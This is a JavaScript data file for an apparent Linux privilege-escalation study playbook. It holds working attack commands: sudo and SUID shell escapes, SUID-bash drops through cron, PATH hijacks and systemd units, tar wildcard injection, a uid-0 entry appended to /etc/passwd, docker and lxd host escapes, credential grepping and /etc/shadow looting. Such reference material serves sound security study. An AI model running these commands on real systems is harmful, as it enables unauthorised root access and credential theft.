/*
  LINUX PRIVILEGE ESCALATION MAP — data for linux-privesc-map.html

  Guided, operator-first playbook (same engine as the AD / Windows maps). Breadth
  is deliberate: when you are stuck on a box, open "Out of ideas?" in the first
  stage and work the checklist — every item links to the stage that abuses it.
  Enumeration-focused; detail lives in the linked theory pages. Rendered by
  assets/js/privmap-main.js (reads window.PRIVMAP_DATA).

  Schema per technique: { id, title, desc, cmds[], outcomes[], moveTo[],
  theory{label,url}, vuln{label,url}, cve{label,id,url}, branches[] }.
*/
window.PRIVMAP_DATA = {
  meta: {
    title: "Linux Privilege Escalation — Guided Playbook",
    version: "v2",
    note: "For authorised testing and study only. Enumerate first, then follow a finding to its stage. Stuck? Open 'Out of ideas?' and work the checklist top to bottom."
  },
  palette: { slate: "#94a3b8", blue: "#3b9ee5", amber: "#f59e0b", violet: "#a78bfa", green: "#4ade80" },
  sections: [
    {
      id: "foothold", title: "Low-Privileged Shell", color: "#94a3b8", tag: "Start here",
      desc: "A shell as a normal user. Enumerate broadly first — on Linux the win is almost always a sudo rule, a SUID binary, a writable job, or a stored credential, not a kernel 0-day.",
      techniques: [
        { id: "enum-sudo", title: "sudo -l — check this first",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "The single fastest win. Any binary you may run via sudo (especially NOPASSWD) is likely a direct root shell via GTFOBins.",
          cmds: ["sudo -l", "id ; sudo -V | head -1   # note the sudo version for CVEs"],
          outcomes: [{ label: "sudo rules found", color: "#3b9ee5" }],
          moveTo: [{ section: "sudo", note: "a NOPASSWD / allowed binary is listed" }] },
        { id: "enum-auto", title: "Automated enumeration (LinPEAS / linux-smart-enum / pspy)",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Run one broad pass, then branch from what it flags. pspy watches cron/root processes live without needing root.",
          cmds: ["./linpeas.sh -a 2>/dev/null | tee linpeas.txt", "./pspy64 -pf -i 1000   # watch for root cron/jobs"],
          outcomes: [{ label: "Findings to triage", color: "#94a3b8" }],
          moveTo: [
            { section: "suid-caps", note: "unusual SUID binaries / capabilities" },
            { section: "cron-path", note: "root cron jobs or writable PATH" },
            { section: "creds", note: "keys / passwords lying around" }
          ] },
        { id: "enum-manual", title: "Manual quick-wins (SUID, caps, writable, groups)",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "The handful of commands that cover most boxes. Cross-reference every SUID bin and capability against GTFOBins.",
          cmds: ["find / -perm -4000 -type f 2>/dev/null       # SUID", "getcap -r / 2>/dev/null                        # capabilities", "id                                            # docker/lxd/disk/adm groups?", "find / -writable -not -path '/proc/*' 2>/dev/null | grep -vE '^/(tmp|dev|run|sys)'"],
          outcomes: [{ label: "Quick-win surface", color: "#94a3b8" }],
          moveTo: [
            { section: "suid-caps", note: "SUID / capability hit" },
            { section: "groups", note: "member of docker / lxd / disk / adm" },
            { section: "writable", note: "a sensitive file is writable" }
          ] },
        { id: "stuck", title: "⟳ Out of ideas? run the full checklist",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "When nothing obvious lands, walk every surface in order. Each branch names the check and the stage that abuses it.",
          cmds: ["./linpeas.sh -a 2>/dev/null | tee linpeas.txt   # re-run broad, then verify each hit by hand"],
          branches: [
            { label: "1. sudo", note: "sudo -l (NOPASSWD / GTFOBins), LD_PRELOAD via env_keep, and the sudo version vs known CVEs.", cmds: ["sudo -l", "sudo -V | head -1"], outcomes: [{ label: "sudo abuse", color: "#3b9ee5" }] },
            { label: "2. SUID / SGID / capabilities", note: "find / -perm -4000; getcap -r /. Cross-reference GTFOBins; cap_setuid on an interpreter = instant root.", cmds: ["find / -perm -4000 -type f 2>/dev/null", "getcap -r / 2>/dev/null"], outcomes: [{ label: "SUID / cap", color: "#3b9ee5" }] },
            { label: "3. Cron, timers & PATH", note: "root cron/systemd-timer running a writable script, a relative command, or a wildcard you control; a writable dir early in a privileged PATH.", cmds: ["cat /etc/crontab ; ls -la /etc/cron.*", "./pspy64 -pf -i 1000"], outcomes: [{ label: "scheduled / PATH", color: "#f59e0b" }] },
            { label: "4. Writable sensitive files", note: "/etc/passwd writable, /etc/shadow readable, a writable systemd unit / sudoers.d / init script.", cmds: ["ls -la /etc/passwd /etc/shadow /etc/sudoers.d", "find /etc/systemd /lib/systemd -writable 2>/dev/null"], outcomes: [{ label: "writable file", color: "#f59e0b" }] },
            { label: "5. Dangerous group membership", note: "docker / lxd / disk / adm / sudo / shadow — each is a known route.", cmds: ["id", "getent group docker lxd disk adm"], outcomes: [{ label: "group abuse", color: "#a78bfa" }] },
            { label: "6. NFS / services / D-Bus", note: "an NFS export with no_root_squash, a writable service socket, or a vulnerable polkit/D-Bus service.", cmds: ["cat /etc/exports 2>/dev/null ; showmount -e <host>", "ss -lptn ; ls -la /run/*.sock 2>/dev/null"], outcomes: [{ label: "service / NFS", color: "#3b9ee5" }] },
            { label: "7. Stored credentials", note: "SSH keys, shell history, app/db config, .env, .git-credentials, backups, mounted shares.", cmds: ["find / \\( -name 'id_*' -o -name '*.pem' -o -name '.env' -o -name '*.kdbx' \\) 2>/dev/null", "grep -riE 'password|secret|token' /home /var/www /opt 2>/dev/null | head"], outcomes: [{ label: "credentials", color: "#a78bfa" }] },
            { label: "8. Kernel / components", note: "uname -r + distro vs PwnKit, Dirty Pipe, Looney Tunables, nf_tables, Dirty COW; also pkexec/polkit and glibc version.", cmds: ["uname -a ; cat /etc/os-release | head -2", "ls -l /usr/bin/pkexec   # SUID pkexec present?"], outcomes: [{ label: "kernel / CVE", color: "#3b9ee5" }] }
          ],
          moveTo: [
            { section: "sudo", note: "finding 1" },
            { section: "suid-caps", note: "finding 2" },
            { section: "cron-path", note: "finding 3" },
            { section: "writable", note: "finding 4" },
            { section: "groups", note: "finding 5" },
            { section: "nfs-services", note: "finding 6" },
            { section: "creds", note: "finding 7" },
            { section: "kernel", note: "finding 8" }
          ] }
      ]
    },
    {
      id: "sudo", title: "Sudo Rule Abuse", color: "#3b9ee5", tag: "sudo -l",
      desc: "Misconfigured sudoers is the most common Linux privesc. A single allowed binary, a kept environment variable, or an old sudo build each reach root.",
      techniques: [
        { id: "gtfobins", title: "GTFOBins shell escape (allowed binary)",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Most binaries you can run via sudo have a documented shell escape (vi/less/awk/find/tar/python/…). Look the binary up on GTFOBins for its exact 'sudo' payload.",
          cmds: ["sudo -l                       # what may I run?", "sudo awk 'BEGIN{system(\"/bin/sh\")}'", "sudo find . -exec /bin/sh \\; -quit", "sudo vim -c ':!/bin/sh'"],
          outcomes: [{ label: "root shell", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "shell-escape yields root" }] },
        { id: "ld-preload", title: "LD_PRELOAD / LD_LIBRARY_PATH via env_keep",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "If sudoers keeps LD_PRELOAD (env_keep) or SETENV is allowed, preload a tiny shared object whose constructor runs as root.",
          cmds: ["sudo -l | grep -i env_keep", "# gcc -shared -fPIC -o /tmp/x.so x.c  (constructor spawns setuid(0) shell)", "sudo LD_PRELOAD=/tmp/x.so <allowed_binary>"],
          outcomes: [{ label: "root shell", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "preloaded code runs as root" }] },
        { id: "sudo-cve", title: "Sudo version CVEs",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Old sudo builds have direct-to-root bugs. Check sudo -V and match the branch.",
          cmds: ["sudo -V | head -1"],
          branches: [
            { label: "Baron Samedit — heap overflow (no sudo rights needed)", cve: "CVE-2021-3156", note: "Any local user on sudo < 1.9.5p2 can get root via a sudoedit argument-parsing heap overflow. Hugely reliable across distros.", cmds: ["sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')   # crashes = likely vulnerable"], outcomes: [{ label: "root", color: "#4ade80" }] },
            { label: "Runas '!root' bypass", cve: "CVE-2019-14287", note: "If sudoers allows a command as '(ALL, !root)', run it as uid -1, which resolves to 0 (root).", cmds: ["sudo -u#-1 /bin/bash"], outcomes: [{ label: "root", color: "#4ade80" }] },
            { label: "sudoedit extra-file write", cve: "CVE-2023-22809", note: "On vulnerable sudo, an EDITOR/SUDO_EDITOR containing '--' lets you edit an arbitrary root-owned file (e.g. /etc/sudoers) through a sudoedit rule.", cmds: ["EDITOR='vi -- /etc/sudoers' sudoedit /the/allowed/file"], outcomes: [{ label: "root", color: "#4ade80" }] }
          ],
          moveTo: [{ section: "root", note: "the bug yields root" }] }
      ]
    },
    {
      id: "suid-caps", title: "SUID Binaries & Capabilities", color: "#3b9ee5", tag: "setuid / caps",
      desc: "A setuid-root binary runs as root for everyone; a file capability grants a specific root power. Either can be a direct shell if the binary is on GTFOBins or is an interpreter.",
      techniques: [
        { id: "suid", title: "SUID binary abuse (GTFOBins)",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Enumerate setuid-root binaries and look each up on GTFOBins for its 'SUID' payload. Custom SUID binaries are worth reversing for a hijackable call.",
          cmds: ["find / -perm -4000 -type f 2>/dev/null", "# examples (GTFOBins 'SUID'):", "/usr/bin/find . -exec /bin/sh -p \\; -quit", "install -m 4755 /bin/bash /tmp/rootbash && /tmp/rootbash -p"],
          outcomes: [{ label: "root shell", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "SUID escape -> root" }] },
        { id: "caps", title: "File capabilities",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "cap_setuid on an interpreter is an instant root shell; cap_dac_read_search reads any file; cap_sys_admin / cap_sys_ptrace are near-root.",
          cmds: ["getcap -r / 2>/dev/null", "# e.g. python with cap_setuid+ep:", "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
          outcomes: [{ label: "root shell", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "capability -> root" }] }
      ]
    },
    {
      id: "cron-path", title: "Cron, Timers, PATH & Wildcards", color: "#f59e0b", tag: "scheduled",
      desc: "A root-run job that executes something you can influence — a writable script, a relative command, or a wildcard argument you control.",
      techniques: [
        { id: "writable-cron", title: "Writable cron / timer script",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "A root cron job or systemd timer that runs a script you can write — append a reverse shell or a SUID-bash drop and wait for the trigger. pspy reveals jobs you can't read in crontab.",
          cmds: ["cat /etc/crontab ; ls -la /etc/cron.d /etc/cron.*", "./pspy64 -pf -i 1000", "echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/to/writable_root_script.sh"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "the job runs your code as root" }] },
        { id: "cron-wildcard", title: "Cron wildcard injection",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "A root job that runs tar/rsync/chown/chmod with a '*' in a directory you can write lets you smuggle option-args as filenames (tar --checkpoint-action is the classic).",
          cmds: ["# root runs e.g.:  tar czf /backup.tgz *   in a writable dir", "echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh", "touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "the smuggled option runs as root" }] },
        { id: "path-relative", title: "Relative PATH hijack (cron / SUID)",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "A root script or custom SUID binary that calls a command without an absolute path resolves it against PATH — prepend a writable directory with your own binary of that name.",
          cmds: ["# strings <suid_binary> | grep -E '^(service|systemctl|cat|cp|id)$'", "echo -e '#!/bin/sh\\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /tmp/hijack/<cmd>", "chmod +x /tmp/hijack/<cmd> ; export PATH=/tmp/hijack:$PATH"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "your binary runs in the root context" }] }
      ]
    },
    {
      id: "writable", title: "Writable Sensitive Files", color: "#f59e0b", tag: "ACLs",
      desc: "A sensitive file a non-root user can write (or a shadow a non-root user can read) is a direct path to root.",
      techniques: [
        { id: "passwd-shadow", title: "Writable /etc/passwd or readable /etc/shadow",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "If /etc/passwd is writable, add a root-equivalent user with a known password. If /etc/shadow is readable, crack the root hash offline.",
          cmds: ["ls -la /etc/passwd /etc/shadow", "openssl passwd -1 -salt x Pass123   # -> hash", "echo 'r00t:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su r00t"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "add a uid-0 user / crack root" }] },
        { id: "service-units", title: "Writable systemd unit / init / sudoers.d",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "A writable service unit, init script, or sudoers.d file runs or authorises as root. Edit ExecStart (or drop a NOPASSWD rule) and restart/trigger it.",
          cmds: ["find /etc/systemd /lib/systemd /etc/init.d /etc/sudoers.d -writable 2>/dev/null", "# set ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' then:", "sudo systemctl daemon-reload && sudo systemctl restart <unit>   # if you can"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "the unit runs as root" }] }
      ]
    },
    {
      id: "groups", title: "Dangerous Group Membership", color: "#a78bfa", tag: "id",
      desc: "Some local groups are root-equivalent by design. Check id — membership alone is often the whole exploit.",
      techniques: [
        { id: "docker", title: "docker group",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "The docker socket is root. A member can mount the host filesystem into a container and read/write it as root.",
          cmds: ["id | grep -o docker", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "chroot into the host as root" }] },
        { id: "lxd", title: "lxd / lxc group",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Import a tiny image, launch a privileged container, and bind-mount the host root into it.",
          cmds: ["id | grep -o lxd", "lxc init alpine r -c security.privileged=true", "lxc config device add r host disk source=/ path=/mnt/root recursive=true", "lxc start r && lxc exec r -- chroot /mnt/root sh"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "privileged container -> host root" }] },
        { id: "disk-adm", title: "disk / adm / shadow / video groups",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "disk grants raw block-device access — read any file (including /etc/shadow) or write a SUID binary with debugfs. adm reads logs (creds); shadow reads hashes.",
          cmds: ["id", "debugfs /dev/sda1       # then: cat /etc/shadow, or write a file"],
          outcomes: [{ label: "root / hashes", color: "#f59e0b" }],
          moveTo: [{ section: "root", note: "raw disk read/write -> root" }] }
      ]
    },
    {
      id: "nfs-services", title: "NFS, Services & D-Bus", color: "#3b9ee5", tag: "services",
      desc: "Host services and shares that expose a root-level primitive to a low-priv user.",
      techniques: [
        { id: "nfs", title: "NFS no_root_squash",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "An export with no_root_squash lets a client's root create root-owned files on the share — mount it from a box where you are root and plant a SUID-root shell.",
          cmds: ["cat /etc/exports 2>/dev/null ; showmount -e <target>", "# on an attacker box you control as root:", "mount -o rw,vers=3 <target>:/export /mnt && cp /bin/bash /mnt/rb && chmod +s /mnt/rb", "# back on the target, as the low-priv user:  /path/rb -p"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "run the planted SUID shell" }] },
        { id: "writable-socket", title: "Writable service socket / config",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "A world-writable unix socket of a root daemon (or a writable config it reloads) can be driven to run commands as root. The docker socket is the famous case; look for others under /run.",
          cmds: ["ss -lpn | grep -i sock ; ls -la /run/*.sock /var/run/*.sock 2>/dev/null", "find / -type s -writable 2>/dev/null"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "drive the daemon as root" }] },
        { id: "polkit-dbus", title: "polkit / D-Bus service abuse",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Beyond the PwnKit CVE, misconfigured polkit rules or a D-Bus service exposing a privileged method can create users or run commands as root (e.g. accountsservice / older systemd flows).",
          cmds: ["pkexec --version ; busctl list 2>/dev/null | grep -i -E 'account|polkit|systemd'", "# look for a polkit action allowed to your user without auth"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "kernel", note: "PwnKit if pkexec is SUID + vulnerable" }, { section: "root", note: "privileged method -> root" }] }
      ]
    },
    {
      id: "creds", title: "Credential Reuse & Looting", color: "#a78bfa", tag: "loot",
      desc: "The quiet path: a password or key for a higher-privileged account, reused from a file, history, or another host.",
      techniques: [
        { id: "keys", title: "SSH keys, history & config files",
          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
          desc: "Private keys, shell history, app/db configs, .env, .git-credentials, and backups routinely hold root or another user's password.",
          cmds: ["find / \\( -name 'id_*' -o -name '*.pem' -o -name '.env' -o -name '*.kdbx' \\) 2>/dev/null", "grep -riE 'password|secret|api[_-]?key|token' /home /var/www /opt /etc 2>/dev/null | head", "cat ~/.bash_history ~/.*_history 2>/dev/null"],
          outcomes: [{ label: "another account", color: "#f59e0b" }],
          moveTo: [{ section: "sudo", note: "su/ssh to the account, re-check sudo -l" }, { section: "root", note: "the account may be root" }] },
        { id: "reuse", title: "Password reuse & pivoting",
          theory: { label: "Linux Lateral Movement & SSH", url: "theory/2026-10-15-linux-lateral-movement-and-ssh.html" },
          desc: "Spray a recovered password against local accounts (su) and the root account, and reuse keys across hosts — password reuse is rampant.",
          cmds: ["for u in root $(cut -d: -f1 /etc/passwd); do echo \"$u\"; done   # candidate users", "su - <user>    # try the recovered password", "ssh -i found_key <user>@<next-host>"],
          outcomes: [{ label: "root / lateral", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "reuse creds to become root" }] }
      ]
    },
    {
      id: "kernel", title: "Kernel & Component Exploits", color: "#3b9ee5", tag: "CVE",
      desc: "When enumeration dries up, match the kernel, glibc, and SUID helpers to a known local-root exploit — but weigh stability and noise; a bad kernel exploit panics the box.",
      techniques: [
        { id: "kernel-cve", title: "Kernel / component CVEs",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Fingerprint the host, then pick the most reliable applicable exploit. The branches are the high-value, widely-applicable ones.",
          cmds: ["uname -a ; cat /etc/os-release | head -2", "ls -l /usr/bin/pkexec ; ldd --version | head -1   # pkexec SUID? glibc ver?"],
          branches: [
            { label: "PwnKit — SUID pkexec (polkit)", cve: "CVE-2021-4034", note: "Memory-corruption in pkexec gives root on virtually every distro with the SUID pkexec present (2009–2022). Extremely reliable.", cmds: ["ls -l /usr/bin/pkexec   # -rwsr-xr-x = SUID present", "./PwnKit   # or the one-file C/py PoC"], outcomes: [{ label: "root", color: "#4ade80" }] },
            { label: "Dirty Pipe — overwrite read-only files", cve: "CVE-2022-0847", note: "Linux 5.8–5.16: a pipe-buffer flaw overwrites read-only files you can open for read — rewrite /etc/passwd or a root SUID binary.", cmds: ["uname -r   # 5.8 .. 5.16.x?", "./dirtypipe /etc/passwd ...   # or hijack a SUID"], outcomes: [{ label: "root", color: "#4ade80" }] },
            { label: "Looney Tunables — glibc ld.so", cve: "CVE-2023-4911", note: "A GLIBC_TUNABLES buffer overflow in the dynamic loader gives root via any SUID binary on many 2023-era distros.", cmds: ["ldd --version | head -1   # match affected glibc", "./looney   # PoC"], outcomes: [{ label: "root", color: "#4ade80" }] },
            { label: "nf_tables netfilter EoP", cve: "CVE-2024-1086", note: "A use-after-free in nf_tables (Linux 5.14–6.6) gives kernel code exec/root on many unpatched 2024 kernels; needs unprivileged user namespaces in some configs.", cmds: ["uname -r ; sysctl kernel.unprivileged_userns_clone 2>/dev/null"], outcomes: [{ label: "root", color: "#4ade80" }] },
            { label: "Dirty COW (legacy)", cve: "CVE-2016-5195", note: "Old but everywhere on unpatched 2.x–4.x kernels: a copy-on-write race to write read-only memory/files.", cmds: ["uname -r   # < 4.8.3 era", "./dirtycow"], outcomes: [{ label: "root", color: "#4ade80" }] }
          ],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "the exploit yields root" }] }
      ]
    },
    {
      id: "root", title: "root", color: "#4ade80", tag: "You own it",
      desc: "You hold root. Loot credentials, establish durable access, and pivot to the next host.",
      techniques: [
        { id: "post", title: "Loot, persist & pivot",
          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
          vuln: { label: "Linux Lateral Movement & SSH", url: "theory/2026-10-15-linux-lateral-movement-and-ssh.html" },
          desc: "Grab /etc/shadow, SSH keys, history, app secrets and tokens, then reuse them to move; scale persistence to the engagement and log every change for clean-up.",
          cmds: ["cat /etc/shadow ; find /home /root -name 'id_*' 2>/dev/null", "# reuse keys/creds to the next host; see Linux persistence for durable access"],
          outcomes: [{ label: "lateral movement", color: "#4ade80" }],
          moveTo: [{ section: "creds", note: "reuse harvested secrets across hosts" }] }
      ]
    }
  ]
};
